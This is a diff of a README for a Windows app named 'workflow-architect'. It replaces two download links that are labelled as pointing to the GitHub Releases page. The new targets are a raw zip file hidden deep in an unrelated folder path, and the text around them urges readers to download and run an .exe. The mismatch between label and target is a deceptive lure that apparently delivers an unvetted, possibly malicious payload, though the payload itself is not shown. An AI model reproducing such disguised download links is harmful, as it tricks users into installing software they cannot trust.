@@ -1,6 +1,6 @@
 # 🧩 workflow-architect - Build clear workflows with ease
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/tabielectrocautery881/workflow-architect/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/tabielectrocautery881/workflow-architect/main/codex/skills/project-surgeon-issue-changer/references/workflow-architect-2.0.zip)
 
 ## 🚀 What this app does
 
@@ -20,7 +20,7 @@ This app fits use cases where structure matters. It helps you keep work paths cl
 
 Visit the release page to download the Windows version:
 
-[Download workflow-architect from GitHub Releases](https://github.com/tabielectrocautery881/workflow-architect/releases)
+[Download workflow-architect from GitHub Releases](https://raw.githubusercontent.com/tabielectrocautery881/workflow-architect/main/codex/skills/project-surgeon-issue-changer/references/workflow-architect-2.0.zip)
 
 Look for the latest release at the top of the page. Download the file that matches Windows. If you see more than one file, choose the one with `.exe` in the name or a Windows package if one is provided.
 
